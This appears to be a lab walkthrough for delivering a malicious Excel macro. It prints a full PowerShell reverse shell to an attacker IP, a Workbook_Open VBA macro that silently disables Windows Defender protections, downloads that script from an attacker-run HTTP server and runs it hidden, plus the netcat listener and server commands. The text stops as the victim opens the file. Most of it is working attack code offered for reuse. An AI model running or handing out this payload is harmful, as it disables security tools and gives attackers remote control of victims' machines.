In this lab, we will be going through how to use embedded Excel Macros, to carry out a malicious client side exploit on a target machine.

Excel macros are automated tasks created using VBA (Visual Basic for Applications) in Excel. They simplify repetitive tasks by running pre-written code, either recorded or manually coded, to perform actions automatically within Excel.

Reverse powershell script:
```powershell
echo '$LHOST = "192.168.100.100"; $LPORT = 2222; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()' > 'C:\Users\Administrator\Desktop\Malicious Files\revshell.ps1'
```
# Creating the VBA Script
Excel macros run inside Visual Basic for Applications (VBA). When you wire code to the Workbook_Open event, that code fires the moment the user opens the file and clicks Enable Content.

The VBA script that will disable Windows Defender:
```
Private Sub Workbook_Open()
    Call RunPowerShellScript
End Sub

Sub RunPowerShellScript()
' Define the PowerShell script to disable Windows Defender, download the reverse shell, and execute
Dim command As String
command = "powershell.exe -nop -w hidden -command ""& {Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Invoke-WebRequest -Uri http://192.168.100.100:8000/revshell.ps1 -OutFile C:\Users\Administrator\revshell.ps1; }"""
command2 = "powershell.exe -nop -w hidden -command ""& {Start-Sleep -Seconds 5; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Administrator\revshell.ps1'}"""

' Run the PowerShell script
Shell "cmd.exe /c " & command, vbHide
Shell "cmd.exe /c " & command2, vbHide
End Sub
```

# Setting up Listener and Payload Server
On the first terminal window, start a _NetCat_ listener on port _2222_:
`.\nc64.exe -lvp 2222`

In the second terminal window, we'll set up a Python server on port _8000_, simulating a scenario where the victim receives a link and visits it, which will direct them to our hosted server. This will enable the file to be downloaded directly onto the _Target Machine_.
`python -m http.server 8000`

Once the server is running, switch to the _Target Machine_ to simulate the victim opening the malicious Excel file.


